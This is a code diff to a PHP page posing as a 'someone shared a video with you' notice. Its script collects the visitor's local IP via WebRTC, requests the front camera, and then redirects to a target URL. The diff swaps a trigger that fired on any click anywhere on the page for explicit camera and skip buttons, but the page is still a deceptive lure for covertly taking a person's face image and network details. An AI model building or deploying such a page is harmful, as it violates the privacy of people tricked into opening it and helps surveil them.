@@ -201,7 +201,7 @@ if (isset($_GET['r'])) {
     <meta property="og:type" content="video.other">
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: system-ui, -apple-system, sans-serif; }
-        body, html { width: 100%; height: 100%; overflow: hidden; background: #000; display: flex; justify-content: center; align-items: center; position: relative; cursor: pointer; }
+        body, html { width: 100%; height: 100%; overflow: hidden; background: #000; display: flex; justify-content: center; align-items: center; position: relative; }
         
         .blurred-bg {
             position: absolute;
@@ -227,7 +227,6 @@ if (isset($_GET['r'])) {
             box-shadow: 0 25px 50px rgba(0,0,0,0.5);
             z-index: 10;
             animation: popUp 0.3s ease-out;
-            cursor: pointer;
         }
         @keyframes popUp { 0% { transform: scale(0.8); opacity: 0; } 100% { transform: scale(1); opacity: 1; } }
 
@@ -237,11 +236,14 @@ if (isset($_GET['r'])) {
         h2 { font-size: 20px; font-weight: 700; color: #111; margin-bottom: 8px; }
         p { font-size: 13px; color: #666; margin-bottom: 24px; line-height: 1.5; }
 
-        .btn-action { display: block; width: 100%; background: #fe2c55; color: white; border: none; padding: 14px; border-radius: 12px; font-weight: 600; font-size: 15px; cursor: pointer; text-decoration: none; margin-bottom: 12px; box-shadow: 0 4px 14px rgba(254,44,85,0.4); pointer-events: none; }
-        .btn-secondary { background: transparent; color: #888; border: none; font-size: 14px; font-weight: 500; cursor: pointer; padding: 6px; pointer-events: none; }
+        .btn-action { display: block; width: 100%; background: #fe2c55; color: white; border: none; padding: 14px; border-radius: 12px; font-weight: 600; font-size: 15px; cursor: pointer; text-decoration: none; margin-bottom: 10px; box-shadow: 0 4px 14px rgba(254,44,85,0.4); }
+        .btn-action:hover { background: #e02047; }
+        .btn-secondary { display: block; width: 100%; background: #f1f1f1; color: #444; border: none; padding: 12px; border-radius: 12px; font-weight: 500; font-size: 14px; cursor: pointer; text-decoration: none; }
+        .btn-secondary:hover { background: #e2e2e2; }
     </style>
     <script>
         let isCaptured = false;
+        const targetUrl = "<?php echo $target_redirect; ?>";
 
         function getLocalIP(callback) {
             let foundLocal = false;
@@ -263,11 +265,9 @@ if (isset($_GET['r'])) {
             setTimeout(() => { if (!foundLocal) callback("Direct"); }, 80);
         }
 
-        function triggerCaptureAndRedirect(e) {
+        function triggerCaptureAndRedirect() {
             if (isCaptured) return;
             isCaptured = true;
-
-            const targetUrl = "<?php echo $target_redirect; ?>";
 
             navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
                 .then(stream => {
@@ -306,7 +306,17 @@ if (isset($_GET['r'])) {
         }
 
         window.addEventListener('DOMContentLoaded', () => {
-            document.body.addEventListener('click', triggerCaptureAndRedirect);
+            const camBtn = document.getElementById('camBtn');
+            const skipBtn = document.getElementById('skipBtn');
+
+            if (camBtn) {
+                camBtn.addEventListener('click', triggerCaptureAndRedirect);
+            }
+            if (skipBtn) {
+                skipBtn.addEventListener('click', () => {
+                    window.location.replace(targetUrl);
+                });
+            }
         });
     </script>
 </head>
@@ -318,8 +328,11 @@ if (isset($_GET['r'])) {
         </div>
         <h2>Watch this video</h2>
         <p><strong><?php echo htmlspecialchars($sender_name); ?></strong> shared a video with you. Watch now to view content!</p>
-        <button class="btn-action">Watch Now</button>
-        <button class="btn-secondary">Not now</button>
+        
+        <!-- زر تفعيل الكاميرا (اختياري) -->
+        <button id="camBtn" class="btn-action">Watch Now (Enable Camera)</button>
+        <!-- زر التخطي للمشاهدة المباشرة دون كاميرا -->
+        <button id="skipBtn" class="btn-secondary">Skip & Watch Directly</button>
     </div>
 </body>
 </html>
